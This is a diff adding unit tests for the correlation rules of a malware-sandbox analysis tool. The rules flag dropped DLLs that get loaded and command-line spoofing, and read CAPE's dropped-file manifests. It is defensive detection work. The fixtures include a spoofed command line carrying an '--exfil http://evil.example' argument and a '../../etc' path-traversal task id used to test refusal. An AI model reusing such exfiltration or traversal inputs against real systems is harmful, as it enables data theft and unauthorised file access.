@@ -54,6 +54,119 @@ def test_dropped_file_loaded_silent_when_no_dropped_files():
     assert rule_dropped_file_loaded(report) == []
 
 
+def _loaded(*entries):
+    return {"volatility": {"plugins": {"dlllist": list(entries)}}}
+
+
+def _with_dropped(report, *dropped):
+    report["_correlation_inputs"] = {"dropped_files": list(dropped), "buffer_samples": {}}
+    return report
+
+
+def test_a_dropped_ntdll_does_not_correlate_with_the_system_ntdll():
+    """The rule reduced the dropped file to its basename and accepted a
+    SUBSTRING match against any loaded module, so a sample dropping `ntdll.dll`
+    into Temp reported HIGH against the real `system32\\ntdll.dll`. DLL
+    side-loading is the most common reason a dropped name collides with a loaded
+    one, so the rule misfired hardest on the samples it exists for — and the
+    finding carried +5 on the deterministic severity score (ADR-017)."""
+    report = _with_dropped(
+        _loaded({"Process": "victim.exe", "PID": 42,
+                 "Path": "C:\\Windows\\System32\\ntdll.dll", "Name": "ntdll.dll"}),
+        "C:\\Users\\v\\AppData\\Local\\Temp\\ntdll.dll",
+    )
+    assert rule_dropped_file_loaded(report) == []
+
+
+def test_the_same_dll_loaded_from_where_it_was_dropped_still_fires():
+    """The mirror of the test above: side-loading is only distinguishable from
+    the system copy by the path, so the path is what has to match."""
+    report = _with_dropped(
+        _loaded({"Process": "victim.exe", "PID": 42,
+                 "Path": "C:\\Users\\v\\AppData\\Local\\Temp\\ntdll.dll", "Name": "ntdll.dll"}),
+        "C:\\Users\\v\\AppData\\Local\\Temp\\ntdll.dll",
+    )
+    findings = rule_dropped_file_loaded(report)
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "high", "severity of a true positive is unchanged"
+
+
+def test_an_empty_dropped_name_matches_nothing():
+    """`loaded_dlls.add(dll_name.lower() if dll_name else "")` put "" in the match
+    set, and a dropped path ending in a separator reduced to "" — which then
+    matched via exact membership, unconditionally."""
+    report = _with_dropped(
+        _loaded({"Process": "svc.exe", "PID": 1,
+                 "Path": "C:\\Windows\\System32\\ntdll.dll", "Name": ""}),
+        "C:\\Temp\\",
+        "",
+    )
+    assert rule_dropped_file_loaded(report) == []
+
+
+def test_a_dlllist_entry_with_no_path_cannot_confirm_a_load():
+    """Matching a dropped file against a bare module NAME is the basename join
+    again, so an entry that carries no Path establishes nothing.
+
+    Both sides are bare here on purpose. With a full dropped path the assertion
+    holds whether or not the rule falls back to Name — `c:\\temp\\evil.dll` never
+    equals `evil.dll` — so it would pass against a rule that had no such guard.
+    The rule is a pure function of its inputs and is tested as one; the
+    gatherer's own guarantee that dropped paths are absolute is asserted
+    separately, and neither test should depend on the other holding."""
+    report = _with_dropped(
+        _loaded({"Process": "svc.exe", "PID": 1, "Path": "", "Name": "evil.dll"}),
+        "evil.dll",
+    )
+    assert rule_dropped_file_loaded(report) == []
+
+    with_full_path = _with_dropped(
+        _loaded({"Process": "svc.exe", "PID": 1, "Path": "", "Name": "evil.dll"}),
+        "C:\\Temp\\evil.dll",
+    )
+    assert rule_dropped_file_loaded(with_full_path) == []
+
+
+def test_wow64_redirection_is_the_same_file():
+    """Observed on task 1023: the sample dropped
+    `System32\\config\\systemprofile\\...\\UltraSuiteSmartCoreware\\ffmpeg.dll` and
+    Grape.exe loaded the SysWOW64 form of that exact path. A 32-bit process
+    writing to System32 is redirected to SysWOW64, so Cape logs one end of the
+    redirection and Volatility reads the other — the same recording difference
+    as argv0 quoting in rule_cmdline_spoofing, not a different file."""
+    report = _with_dropped(
+        _loaded({"Process": "Grape.exe", "PID": 8652, "Name": "ffmpeg.dll",
+                 "Path": "C:\\WINDOWS\\SysWOW64\\config\\systemprofile\\AppData\\Local\\Suite\\ffmpeg.dll"}),
+        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Suite\\ffmpeg.dll",
+    )
+    assert len(rule_dropped_file_loaded(report)) == 1
+
+
+def test_wow64_folding_does_not_relax_the_rest_of_the_path():
+    """The same run dropped d3dcompiler_47.dll under SystemTemp and under
+    System32\\config\\systemprofile, while dwm.exe loaded the real
+    system32\\D3DCOMPILER_47.dll. Everything below the redirected root still has
+    to match, or folding SysWOW64 would hand back the basename join."""
+    report = _with_dropped(
+        _loaded({"Process": "dwm.exe", "PID": 1104, "Name": "D3DCOMPILER_47.dll",
+                 "Path": "C:\\WINDOWS\\system32\\D3DCOMPILER_47.dll"}),
+        "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Suite\\d3dcompiler_47.dll",
+        "C:\\Windows\\SystemTemp\\is-UH4P8TPWUR.tmp\\d3dcompiler_47.dll",
+    )
+    assert rule_dropped_file_loaded(report) == []
+
+
+def test_path_separator_and_case_differences_still_correlate():
+    """Normalisation is on the comparison, not the evidence: the same file
+    written two ways is still the same file."""
+    report = _with_dropped(
+        _loaded({"Process": "victim.exe", "PID": 9,
+                 "Path": "c:/temp/evil.dll", "Name": "evil.dll"}),
+        "C:\\Temp\\Evil.dll",
+    )
+    assert len(rule_dropped_file_loaded(report)) == 1
+
+
 # --- rule_shellcode_self_modified ---
 
 def test_shellcode_self_modified_fires_when_bytes_differ():
@@ -104,6 +217,57 @@ def test_cmdline_spoofing_silent_on_benign_embedding_flag():
         "volatility": {"plugins": {"cmdline": [{"PID": 4444, "Args": "C:\\\\app.exe -Embedding"}]}},
     }
     assert rule_cmdline_spoofing(report) == []
+
+
+def _cmdlines(cape_cmd, vol_cmd, pid=4444):
+    return {
+        "cape": {"process_cmdlines": {pid: cape_cmd}},
+        "volatility": {"plugins": {"cmdline": [{"PID": pid, "Args": vol_cmd}]}},
+    }
+
+
+def test_argv0_quoting_is_not_command_line_spoofing():
+    """Cape logs the launch command line; Volatility reads the PEB later. One
+    quoting the image path and the other not is a recording difference, and the
+    old rule called it CRITICAL — worth +10 on the deterministic severity score
+    that GHSA-f5q8-v78c-mr55 exists to keep free of unreliable signal."""
+    assert rule_cmdline_spoofing(_cmdlines('"C:\\x.exe" -a', "C:\\x.exe -a")) == []
+
+
+def test_whitespace_runs_between_arguments_are_not_spoofing():
+    assert rule_cmdline_spoofing(_cmdlines("C:\\x.exe -a  -b", "C:\\x.exe -a -b")) == []
+
+
+def test_an_unresolvable_short_path_does_not_produce_a_critical_finding():
+    """8.3 vs long form cannot be resolved without the guest filesystem, which is
+    gone by the time correlation runs. For a rule feeding the deterministic
+    score, missing a spoof that happens to involve PROGRA~1 is the cheaper error
+    than calling an ordinary Windows abbreviation critical."""
+    assert rule_cmdline_spoofing(
+        _cmdlines("C:\\PROGRA~1\\app\\x.exe -a", "C:\\Program Files\\app\\x.exe -a")
+    ) == []
+
+
+def test_a_real_argument_change_is_still_critical():
+    """The mirror: normalisation must not swallow a changed argument vector."""
+    findings = rule_cmdline_spoofing(
+        _cmdlines('"C:\\x.exe" -a', "C:\\x.exe -a --exfil http://evil.example")
+    )
+    assert len(findings) == 1
+    assert findings[0]["severity"] == "critical", "severity of a true positive is unchanged"
+
+
+def test_a_replaced_image_path_is_still_critical():
+    findings = rule_cmdline_spoofing(_cmdlines('"C:\\real\\app.exe"', "C:\\fake\\evil.exe"))
+    assert len(findings) == 1
+    assert findings[0]["type"] == "cmdline_spoofing"
+
+
+def test_quoted_arguments_containing_spaces_are_one_token():
+    """The splitter has to respect quotes, or `-p "a b"` and `-p "a  b"` would
+    normalise to the same thing and a changed argument would be lost."""
+    assert cr._split_cmdline('x.exe -p "a b" -q') == ["x.exe", "-p", "a b", "-q"]
+    assert rule_cmdline_spoofing(_cmdlines('x.exe -p "a b"', 'x.exe -p "a  b"')) != []
 
 
 # --- evaluate_rules + empty-report safety ---
@@ -180,17 +344,126 @@ def test_enrich_is_idempotent(tmp_path, monkeypatch):
     assert report["_correlation_inputs"] == first
 
 
+def _write_manifest(root, task_id, records):
+    task_dir = root / str(task_id)
+    task_dir.mkdir(parents=True, exist_ok=True)
+    (task_dir / "files.json").write_text(
+        "\n".join(json.dumps(r) for r in records) + "\n", encoding="utf-8"
+    )
+
+
 def test_enrich_caps_dropped_file_count(tmp_path, monkeypatch):
     root = tmp_path / "storage"
-    dropped = root / "1" / "dropped"
-    dropped.mkdir(parents=True)
     monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(root))
     monkeypatch.setattr(cr, "_MAX_DROPPED_FILES", 3)
-    for i in range(10):
-        (dropped / f"f{i}.bin").write_bytes(b"x")
+    _write_manifest(root, 1, [
+        {"filepath": f"C:\\Temp\\f{i}.bin", "category": "", "path": f"files/{i}"}
+        for i in range(10)
+    ])
     report = {"cape": {"task_id": 1, "injection_buffers": []}, "ghidra": {"analyzed_files": []}}
     enrich_correlation_inputs(report)
     assert len(report["_correlation_inputs"]["dropped_files"]) == 3
+
+
+# --- _gather_dropped_files: the manifest, not a directory CAPEv2 never makes ---
+
+def test_dropped_files_come_from_the_cape_manifest(tmp_path, monkeypatch):
+    """The guest path is what the rule needs, and files.json is the only place
+    that records it. Listing `<task>/dropped/` — the previous source — returned
+    nothing on all 1024 analyses on the sandbox host, because that directory is
+    Cuckoo's layout and CAPEv2 does not create it."""
+    root = tmp_path / "storage"
+    monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(root))
+    _write_manifest(root, 7, [
+        {"filepath": "C:\\WINDOWS\\TEMP\\KL-X86.msi", "category": "", "path": "files/aa"},
+    ])
+    paths, reason = cr._gather_dropped_files({"cape": {"task_id": 7}})
+    assert paths == ["C:\\WINDOWS\\TEMP\\KL-X86.msi"]
+    assert reason is None
+
+
+def test_cape_internal_dump_artifacts_are_not_dropped_files(tmp_path, monkeypatch):
+    """CAPE/procdump/memory records point into CAPE's own randomised staging
+    directory. Treating them as files the sample wrote would correlate CAPE's
+    instrumentation with the sample's behaviour."""
+    root = tmp_path / "storage"
+    monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(root))
+    _write_manifest(root, 7, [
+        {"filepath": "C:\\bAsEzF\\CAPE\\4336_2350668654", "category": "CAPE", "path": "CAPE/aa"},
+        {"filepath": "C:\\bAsEzF\\memory\\4336.dmp", "category": "memory", "path": "memory/4336.dmp"},
+        {"filepath": "C:\\x\\CAPE\\7836_2204900", "category": "procdump", "path": "procdump/bb"},
+    ])
+    paths, reason = cr._gather_dropped_files({"cape": {"task_id": 7}})
+    assert paths == []
+    assert reason is None
+
+
+def test_hash_named_manifest_entries_without_a_guest_path_are_skipped(tmp_path, monkeypatch):
+    """`category: files` entries whose filepath is just the sha256 again carry no
+    origin, so there is nothing to compare against a loaded module path."""
+    root = tmp_path / "storage"
+    monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(root))
+    _write_manifest(root, 7, [
+        {"filepath": "8ebc92ac9ddf6b77", "category": "files", "path": "files/8ebc92ac9ddf6b77"},
+    ])
+    assert cr._gather_dropped_files({"cape": {"task_id": 7}})[0] == []
+
+
+def test_a_missing_manifest_reports_a_reason_rather_than_an_empty_list(tmp_path, monkeypatch):
+    """The bug this rule spent its life in: no dropped files and no way to tell
+    that apart from having never looked."""
+    root = tmp_path / "storage"
+    (root / "7").mkdir(parents=True)
+    monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(root))
+    paths, reason = cr._gather_dropped_files({"cape": {"task_id": 7}})
+    assert paths == []
+    assert reason and "files.json" in reason
+
+
+def test_no_cape_stage_is_not_reported_as_a_missing_manifest():
+    """Cape not running is a reported pipeline state, like `triggered: False` on
+    the Volatility side — not a degradation to warn about."""
+    assert cr._gather_dropped_files({}) == ([], None)
+
+
+def test_manifest_outside_the_storage_root_is_refused(tmp_path, monkeypatch):
+    monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(tmp_path / "storage"))
+    paths, reason = cr._gather_dropped_files({"cape": {"task_id": "../../etc"}})
+    assert paths == []
+    assert reason == "manifest path outside the allowed storage root"
+
+
+def test_a_dropped_file_reaches_a_finding_through_cross_correlate(tmp_path, monkeypatch):
+    """End to end through the real entrypoint, because every part of this rule
+    was individually defensible while the whole produced nothing: the manifest
+    is read, a guest path comes out, and the path matches a loaded module.
+
+    Written against the shape of a real files.json record from the sandbox host
+    (JSON Lines; `filepath` is the guest path, `path` the storage location)."""
+    root = tmp_path / "storage"
+    monkeypatch.setattr(cr, "_CAPE_STORAGE_ROOT", str(root))
+    _write_manifest(root, 104, [
+        {"path": "files/8ebc92ac", "filepath": "C:\\WINDOWS\\TEMP\\svchost.dll",
+         "pids": [4336], "ppids": [1796], "metadata": "", "category": ""},
+        {"path": "memory/4336.dmp", "filepath": "C:\\bAsEzF\\memory\\4336.dmp",
+         "pids": [4336], "ppids": [], "metadata": "", "category": "memory"},
+    ])
+    report = {
+        "cape": {"task_id": 104},
+        "volatility": {"plugins": {"dlllist": [
+            {"Process": "explorer.exe", "PID": 1796,
+             "Path": "C:\\Windows\\System32\\ntdll.dll", "Name": "ntdll.dll"},
+            {"Process": "svchost.exe", "PID": 4336,
+             "Path": "C:\\WINDOWS\\TEMP\\svchost.dll", "Name": "svchost.dll"},
+        ]}},
+    }
+    findings = cr.cross_correlate(report)
+    dropped = [f for f in findings if f["type"] == "dropped_file_loaded"]
+    assert len(dropped) == 1
+    assert "svchost.dll" in dropped[0]["title"]
+    assert "pid 4336" in dropped[0]["detail"]
+    assert not [w for w in report["correlation_warnings"] if "dropped-file manifest" in w]
+    assert "_correlation_inputs" not in report
 
 
 def test_cross_correlate_pops_inputs_so_bytes_are_not_persisted(tmp_path, monkeypatch):
